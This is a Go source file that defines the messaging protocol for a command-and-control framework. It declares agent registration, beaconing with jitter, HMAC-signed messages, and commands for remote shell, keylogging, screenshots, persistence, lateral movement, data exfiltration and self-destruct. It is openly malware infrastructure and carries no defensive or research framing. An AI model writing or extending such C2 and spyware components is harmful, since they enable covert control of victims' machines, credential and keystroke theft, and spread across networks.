package protocol

import (
	"encoding/json"
	"time"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
)

// MessageType defines the different kinds of messages that can be exchanged
type MessageType int

const (
	Beacon MessageType = iota
	Command
	Response
	FileTransfer
	Screenshot
	KeylogData
	ProcessList
	AgentRegistration
)

// Message is the basic unit of communication between the C2 server and agents
type Message struct {
	Type        MessageType     `json:"type"`
	AgentID     string          `json:"agent_id"`
	Timestamp   int64           `json:"timestamp"`
	Sequence    uint64          `json:"seq"`
	Data        json.RawMessage `json:"data"`
	Signature   string          `json:"signature"`
}

// Agent stores information about a connected agent
type Agent struct {
	ID              string    `json:"id"`
	Hostname        string    `json:"hostname"`
	Username        string    `json:"username"`
	OS              string    `json:"os"`
	Architecture    string    `json:"arch"`
	IP              string    `json:"ip"`
	FirstSeen       time.Time `json:"first_seen"`
	LastSeen        time.Time `json:"last_seen"`
	Version         string    `json:"version"`
	BeaconInterval  int       `json:"beacon_interval"` // in seconds
	Jitter          int       `json:"jitter"`          // percentage of beacon interval
	SharedKey       string    `json:"shared_key"`      // For signature validation
	PendingCommands []Command `json:"pending_commands"`
	LastSequence    uint64    `json:"last_sequence"`
}

// Command represents an instruction sent to an agent
type Command struct {
	ID          string          `json:"id"`
	CommandType string          `json:"command_type"`
	Args        json.RawMessage `json:"args"`
	Timeout     int             `json:"timeout"` // in seconds, 0 means no timeout
	Status      string          `json:"status"`  // pending, in-progress, completed, failed
	IssuedAt    time.Time       `json:"issued_at"`
	CompletedAt time.Time       `json:"completed_at,omitempty"`
	Result      json.RawMessage `json:"result,omitempty"`
}

// NewMessage creates a new message with properly set metadata
func NewMessage(msgType MessageType, agentID string, data []byte, key string) Message {
	now := time.Now()
	msg := Message{
		Type:      msgType,
		AgentID:   agentID,
		Timestamp: now.Unix(),
		Data:      data,
	}
	
	// Sign the message
	msg.Signature = signMessage(msg, key)
	
	return msg
}

// Verify checks if the message signature is valid
func (m Message) Verify(key string) bool {
	expectedSignature := signMessage(m, key)
	return hmac.Equal([]byte(m.Signature), []byte(expectedSignature))
}

// signMessage generates an HMAC signature for the message
func signMessage(m Message, key string) string {
	// Create a copy without the signature field
	msgCopy := m
	msgCopy.Signature = ""
	
	// Marshal to JSON
	data, err := json.Marshal(msgCopy)
	if err != nil {
		return ""
	}
	
	// Calculate HMAC
	h := hmac.New(sha256.New, []byte(key))
	h.Write(data)
	return hex.EncodeToString(h.Sum(nil))
}

// Command types for C2 operations
const (
	CmdShell       = "shell"
	CmdDownload    = "download"
	CmdUpload      = "upload"
	CmdScreenshot  = "screenshot"
	CmdProcessList = "ps"
	CmdKeylogger   = "keylogger"
	CmdSleep       = "sleep"
	CmdSelfDestruct = "self-destruct"
	CmdUpdateConfig = "update-config"
	CmdPersistence = "persistence"
	CmdProxy       = "proxy"
	CmdLateralMove = "lateral-move"
	CmdExfilData   = "exfil"
)

// AgentRegistrationData contains the information sent by a new agent
type AgentRegistrationData struct {
	Hostname     string `json:"hostname"`
	Username     string `json:"username"`
	OS           string `json:"os"`
	Architecture string `json:"arch"`
	IP           string `json:"ip"`
	Version      string `json:"version"`
}

// ShellCommandArgs contains arguments for a shell command
type ShellCommandArgs struct {
	Command string `json:"command"`
}

// FileTransferArgs contains arguments for file transfer operations
type FileTransferArgs struct {
	Path        string `json:"path"`
	Destination string `json:"destination"`
	Chunk       int    `json:"chunk"`
	TotalChunks int    `json:"total_chunks"`
	Data        string `json:"data"` // Base64 encoded
}

// EncodeCommand serializes a command to JSON
func EncodeCommand(cmd Command) ([]byte, error) {
	return json.Marshal(cmd)
}

// DecodeMessage parses a JSON message
func DecodeMessage(data []byte) (Message, error) {
	var msg Message
	err := json.Unmarshal(data, &msg)
	if err != nil {
		return Message{}, fmt.Errorf("failed to decode message: %v", err)
	}
	return msg, nil
}